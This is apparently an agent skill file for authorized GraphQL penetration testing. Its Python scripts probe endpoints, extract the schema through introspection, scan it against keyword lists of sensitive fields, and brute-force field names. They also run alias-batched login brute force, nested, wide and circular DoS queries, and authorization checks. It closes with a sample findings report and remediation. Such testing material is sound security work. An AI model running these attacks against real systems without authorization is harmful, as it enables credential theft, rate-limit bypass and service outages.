---
name: performing-graphql-introspection-attack
description: >
  Performs GraphQL introspection attacks to extract the full API schema including types, queries,
  mutations, subscriptions, and field definitions from GraphQL endpoints. The tester uses
  introspection queries to map the attack surface, identifies sensitive fields and mutations,
  tests for query depth and complexity limits, and exploits GraphQL-specific vulnerabilities
  including batching attacks, alias-based brute force, and nested query DoS. Activates for
  requests involving GraphQL security testing, introspection attack, GraphQL enumeration, or
  GraphQL API penetration testing.
domain: cybersecurity
subdomain: api-security
tags: [api-security, graphql, introspection, schema-extraction, query-abuse]
version: 1.0.0
author: mahipal
license: Apache-2.0
---
# Performing GraphQL Introspection Attack

## When to Use

- Testing GraphQL endpoints for exposed introspection that reveals the complete API schema
- Mapping the attack surface of a GraphQL API to identify sensitive queries, mutations, and types
- Testing for GraphQL-specific vulnerabilities including query depth abuse, batching attacks, and field-level authorization
- Assessing GraphQL implementations where introspection is disabled but schema can be reconstructed through error messages
- Evaluating defenses against resource exhaustion through deeply nested or complex GraphQL queries

**Do not use** without written authorization. Schema extraction and query abuse testing can impact service availability.

## Prerequisites

- Written authorization specifying the GraphQL endpoint and testing scope
- Burp Suite Professional with InQL extension (v6.1+) for automated schema analysis
- Python 3.10+ with `requests` and `gql` libraries
- GraphQL Voyager or GraphQL Playground for schema visualization
- Clairvoyance tool for schema reconstruction when introspection is disabled
- Wordlists for GraphQL field and type name brute-forcing

## Workflow

### Step 1: GraphQL Endpoint Discovery

```python
import requests
import json

TARGET = "https://target-api.example.com"
headers = {"Content-Type": "application/json"}

# Common GraphQL endpoint paths
GRAPHQL_PATHS = [
    "/graphql", "/graphql/", "/gql", "/query",
    "/api/graphql", "/api/gql", "/api/v1/graphql",
    "/v1/graphql", "/v2/graphql",
    "/graphql/console", "/graphql/playground",
    "/graphiql", "/altair", "/explorer",
    "/graph", "/api/graph",
]

# Probe for GraphQL endpoints
for path in GRAPHQL_PATHS:
    # Test with a simple introspection query
    query = {"query": "{ __typename }"}
    try:
        resp = requests.post(f"{TARGET}{path}", headers=headers, json=query, timeout=5)
        if resp.status_code == 200 and ("data" in resp.text or "__typename" in resp.text):
            print(f"[FOUND] GraphQL endpoint: {TARGET}{path}")
            print(f"  Response: {resp.text[:200]}")
    except requests.exceptions.RequestException:
        pass

    # Also test GET method
    try:
        resp = requests.get(f"{TARGET}{path}?query={{__typename}}", timeout=5)
        if resp.status_code == 200 and ("data" in resp.text or "__typename" in resp.text):
            print(f"[FOUND] GraphQL endpoint (GET): {TARGET}{path}")
    except requests.exceptions.RequestException:
        pass
```

### Step 2: Full Introspection Query

```python
GRAPHQL_URL = f"{TARGET}/graphql"
auth_headers = {**headers, "Authorization": "Bearer <token>"}

# Full introspection query to extract complete schema
FULL_INTROSPECTION = {
    "query": """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
    """
}

resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=FULL_INTROSPECTION)

if resp.status_code == 200:
    schema = resp.json()
    if "data" in schema and "__schema" in schema["data"]:
        print("[VULNERABLE] Full introspection enabled")
        types = schema["data"]["__schema"]["types"]

        # Categorize types
        custom_types = [t for t in types if not t["name"].startswith("__")]
        queries = schema["data"]["__schema"]["queryType"]
        mutations = schema["data"]["__schema"].get("mutationType")

        print(f"\nSchema Summary:")
        print(f"  Custom Types: {len(custom_types)}")
        print(f"  Query Type: {queries['name'] if queries else 'None'}")
        print(f"  Mutation Type: {mutations['name'] if mutations else 'None'}")

        # List all custom types and their fields
        for t in custom_types:
            if t.get("fields"):
                print(f"\n  Type: {t['name']}")
                for field in t["fields"]:
                    field_type = field["type"]["name"] or field["type"].get("ofType", {}).get("name", "")
                    print(f"    - {field['name']}: {field_type}")

        # Save schema for further analysis
        with open("graphql_schema.json", "w") as f:
            json.dump(schema, f, indent=2)
        print("\nSchema saved to graphql_schema.json")
    else:
        print("[SECURED] Introspection disabled or restricted")
        print(f"Response: {resp.text[:500]}")
else:
    print(f"Request failed: {resp.status_code}")
```

### Step 3: Sensitive Data Identification in Schema

```python
# Analyze the extracted schema for sensitive fields and types
SENSITIVE_INDICATORS = {
    "field_names": [
        "password", "passwordHash", "secret", "token", "apiKey", "ssn",
        "socialSecurity", "creditCard", "cardNumber", "cvv", "pin",
        "privateKey", "internalId", "salary", "bankAccount", "taxId",
        "mfaSecret", "refreshToken", "sessionId", "debugInfo"
    ],
    "type_names": [
        "Admin", "Internal", "Debug", "Secret", "Private",
        "SystemConfig", "AuditLog", "PaymentInfo", "Credential"
    ],
    "mutation_names": [
        "deleteUser", "resetPassword", "changeRole", "elevatePrivilege",
        "createAdmin", "disableMFA", "exportData", "deleteAuditLog",
        "updateConfig", "runMigration", "executeQuery"
    ]
}

if "data" in schema:
    print("\n=== Sensitive Schema Analysis ===\n")

    for t in custom_types:
        # Check type names
        for sensitive_type in SENSITIVE_INDICATORS["type_names"]:
            if sensitive_type.lower() in t["name"].lower():
                print(f"[SENSITIVE TYPE] {t['name']}")

        # Check field names
        if t.get("fields"):
            for field in t["fields"]:
                for sensitive_field in SENSITIVE_INDICATORS["field_names"]:
                    if sensitive_field.lower() in field["name"].lower():
                        print(f"[SENSITIVE FIELD] {t['name']}.{field['name']}")

    # Check mutation names
    if mutations:
        mutation_type = next((t for t in types if t["name"] == mutations["name"]), None)
        if mutation_type and mutation_type.get("fields"):
            for mutation in mutation_type["fields"]:
                for sensitive_mut in SENSITIVE_INDICATORS["mutation_names"]:
                    if sensitive_mut.lower() in mutation["name"].lower():
                        print(f"[SENSITIVE MUTATION] {mutation['name']}")
```

### Step 4: Schema Reconstruction When Introspection is Disabled

```python
# Use field suggestion errors to reconstruct the schema
def bruteforce_field(type_name, field_wordlist):
    """Use GraphQL error messages to discover valid fields."""
    discovered_fields = []

    for field_name in field_wordlist:
        query = {"query": f"{{ {type_name} {{ {field_name} }} }}"}
        resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=query)
        response_text = resp.text.lower()

        # GraphQL often suggests valid field names in error messages
        if "did you mean" in response_text:
            # Extract suggestions
            import re
            suggestions = re.findall(r'"(\w+)"', resp.text)
            for s in suggestions:
                if s not in discovered_fields:
                    discovered_fields.append(s)
                    print(f"  [DISCOVERED] {type_name}.{s} (via suggestion)")

        elif resp.status_code == 200 and "errors" not in resp.json():
            discovered_fields.append(field_name)
            print(f"  [VALID] {type_name}.{field_name}")

    return discovered_fields

# Common GraphQL field names wordlist
FIELD_WORDLIST = [
    "id", "name", "email", "username", "password", "role", "token",
    "createdAt", "updatedAt", "status", "type", "description", "title",
    "firstName", "lastName", "phone", "address", "avatar", "bio",
    "isAdmin", "isActive", "permissions", "groups", "orders", "items",
    "price", "quantity", "total", "currency", "paymentMethod",
    "ssn", "dateOfBirth", "creditCard", "bankAccount", "salary",
    "apiKey", "secretKey", "refreshToken", "mfaEnabled", "lastLogin",
]

# Try to discover fields on common type names
for type_name in ["user", "users", "me", "currentUser", "admin", "order", "account"]:
    print(f"\nBrute-forcing fields on '{type_name}':")
    fields = bruteforce_field(type_name, FIELD_WORDLIST)
```

### Step 5: GraphQL Attack Techniques

```python
# Attack 1: Alias-based batching for brute force (bypasses rate limiting)
def alias_brute_force_login(usernames, password="Password123"):
    """Use GraphQL aliases to send multiple login attempts in one request."""
    aliases = []
    for i, username in enumerate(usernames[:100]):  # Max 100 per batch
        aliases.append(f"""
        attempt_{i}: login(username: "{username}", password: "{password}") {{
            token
            user {{ id email }}
        }}
        """)

    query = {"query": "mutation { " + " ".join(aliases) + " }"}
    resp = requests.post(GRAPHQL_URL, headers=headers, json=query)
    if resp.status_code == 200:
        data = resp.json().get("data", {})
        for key, value in data.items():
            if value and value.get("token"):
                print(f"[SUCCESS] {key}: token obtained")
    return resp

# Attack 2: Query depth attack (DoS)
def generate_deep_query(depth=50):
    """Generate a deeply nested query to test depth limits."""
    query = "{ users { friends " * depth
    query += "{ id name }" + " } " * depth + " }"
    return {"query": query}

deep_query = generate_deep_query(20)
resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=deep_query)
print(f"Depth 20 query: {resp.status_code}")
if resp.status_code == 200 and "errors" not in resp.json():
    print("[VULNERABLE] No query depth limit enforced")

# Attack 3: Field duplication attack (resource exhaustion)
def generate_wide_query(width=1000):
    """Repeat expensive fields many times using aliases."""
    fields = " ".join([f"field_{i}: users {{ id email name role }}" for i in range(width)])
    return {"query": "{ " + fields + " }"}

wide_query = generate_wide_query(500)
resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=wide_query)
print(f"Width 500 query: {resp.status_code}")

# Attack 4: Batched queries
batch_queries = [
    {"query": "{ users { id email } }"},
    {"query": "{ orders { id total } }"},
    {"query": "{ admin { settings } }"},
] * 100  # 300 queries in one request

resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=batch_queries)
print(f"Batch 300 queries: {resp.status_code}")

# Attack 5: Circular fragment (DoS)
circular_query = {
    "query": """
    query {
      users {
        ...UserFields
      }
    }
    fragment UserFields on User {
      friends {
        ...UserFields
      }
    }
    """
}
resp = requests.post(GRAPHQL_URL, headers=auth_headers, json=circular_query)
print(f"Circular fragment: {resp.status_code}")
```

### Step 6: Field-Level Authorization Testing

```python
# Test if different user roles can access the same fields
user_token = "Bearer <regular_user_token>"
admin_token_val = "Bearer <admin_token>"

# Query sensitive fields as regular user
sensitive_queries = [
    {
        "name": "User PII fields",
        "query": '{ users { id email ssn dateOfBirth salary internalNotes } }'
    },
    {
        "name": "Admin mutations",
        "query": 'mutation { deleteUser(id: "1002") { success } }'
    },
    {
        "name": "System config",
        "query": '{ systemConfig { databaseUrl secretKey apiKeys } }'
    },
    {
        "name": "Audit logs",
        "query": '{ auditLogs { action userId ipAddress timestamp } }'
    },
]

for sq in sensitive_queries:
    # Test as regular user
    resp_user = requests.post(GRAPHQL_URL,
        headers={**headers, "Authorization": user_token},
        json={"query": sq["query"]})

    # Test as admin
    resp_admin = requests.post(GRAPHQL_URL,
        headers={**headers, "Authorization": admin_token_val},
        json={"query": sq["query"]})

    user_ok = resp_user.status_code == 200 and "errors" not in resp_user.json()
    admin_ok = resp_admin.status_code == 200 and "errors" not in resp_admin.json()

    if user_ok and admin_ok:
        print(f"[BFLA] {sq['name']}: Both user and admin can access")
    elif user_ok and not admin_ok:
        print(f"[ANOMALY] {sq['name']}: User can access but admin cannot")
    elif not user_ok and admin_ok:
        print(f"[SECURE] {sq['name']}: Only admin can access")
    else:
        print(f"[BLOCKED] {sq['name']}: Neither can access")
```

## Key Concepts

| Term | Definition |
|------|------------|
| **GraphQL Introspection** | Built-in capability to query the schema definition, exposing all types, fields, queries, mutations, and subscriptions available in the API |
| **Query Depth Attack** | Sending deeply nested queries that cause exponential resolver execution, consuming server resources and potentially causing DoS |
| **Alias-Based Batching** | Using GraphQL aliases to execute multiple operations in a single request, bypassing per-request rate limiting |
| **Schema Reconstruction** | Reconstructing the GraphQL schema when introspection is disabled by analyzing error messages and field suggestions |
| **Field-Level Authorization** | Controlling access to individual fields within a GraphQL type based on the authenticated user's role or permissions |
| **Query Complexity Analysis** | Calculating the computational cost of a GraphQL query before execution to enforce resource limits |

## Tools & Systems

- **InQL (Burp Suite Extension)**: Automated GraphQL introspection, schema analysis, and attack generation with support for schema brute-forcing
- **Clairvoyance**: Schema reconstruction tool that works even when introspection is disabled, using error-based field discovery
- **GraphQL Voyager**: Visual schema explorer that generates interactive diagrams from introspection results
- **Altair GraphQL Client**: Feature-rich GraphQL IDE for crafting and testing queries with authentication support
- **graphql-cop**: GraphQL security auditor that tests for common misconfigurations including introspection, field suggestions, and query limits

## Common Scenarios

### Scenario: E-Commerce GraphQL API Security Assessment

**Context**: An e-commerce platform migrated from REST to GraphQL. The GraphQL endpoint serves the web and mobile frontends. Introspection was left enabled during development and was not disabled for production.

**Approach**:
1. Run full introspection query against `/graphql` endpoint - complete schema extracted with 45 types, 120 queries, and 38 mutations
2. Identify sensitive types: `AdminUser`, `PaymentInfo`, `InternalConfig`, `AuditLog`
3. Discover that `User` type exposes `passwordHash`, `mfaSecret`, and `lastLoginIp` fields
4. Find admin mutations accessible to regular users: `deleteUser`, `updateRole`, `exportAllOrders`
5. Test query depth: no limit enforced, nested query 50 levels deep executes successfully and takes 45 seconds
6. Test alias batching: 1000 login attempts in a single request bypass rate limiting
7. Test batch queries: array of 500 queries accepted without limit
8. Schema reveals internal `InternalConfig` type with `databaseConnectionString` and `stripeSecretKey` fields

**Pitfalls**:
- Assuming introspection is the only way to discover the schema (error messages and field suggestions reveal information even when introspection is disabled)
- Not testing mutations which often have weaker authorization than queries
- Missing subscription endpoints that may expose real-time data streams without authentication
- Not testing query complexity limits with realistic payloads that trigger expensive database operations
- Ignoring that GraphQL over WebSocket (subscriptions) may have different authentication requirements

## Output Format

```
## Finding: GraphQL Introspection Enabled with Sensitive Schema Exposure

**ID**: API-GQL-001
**Severity**: High (CVSS 7.5)
**Affected Endpoint**: POST /graphql
**Tools Used**: InQL, Clairvoyance, custom Python scripts

**Description**:
The GraphQL endpoint has introspection enabled in production, exposing
the complete API schema including 45 types, 120 queries, and 38 mutations.
The schema reveals sensitive internal types (AdminUser, PaymentInfo,
InternalConfig) and exposes fields containing password hashes, MFA secrets,
and database connection strings. No query depth or complexity limits are
enforced, enabling denial-of-service through nested queries.

**Schema Highlights**:
- User.passwordHash: bcrypt hash exposed
- User.mfaSecret: TOTP secret exposed (allows MFA bypass)
- InternalConfig.databaseConnectionString: Production DB credentials
- InternalConfig.stripeSecretKey: Payment processing API key
- 12 admin mutations accessible to regular users

**Impact**:
An attacker can extract the complete API schema, identify sensitive
fields, access password hashes and MFA secrets for any user, retrieve
production database credentials, and execute admin-only mutations.

**Remediation**:
1. Disable introspection in production: set introspection to false in the GraphQL server config
2. Implement field-level authorization using GraphQL directives (@auth, @hasRole)
3. Remove sensitive fields from the schema or restrict them with authorization middleware
4. Implement query depth limiting (max 10 levels) and complexity scoring
5. Disable field suggestions in error messages to prevent schema reconstruction
6. Rate limit GraphQL requests per query, not just per HTTP request
```
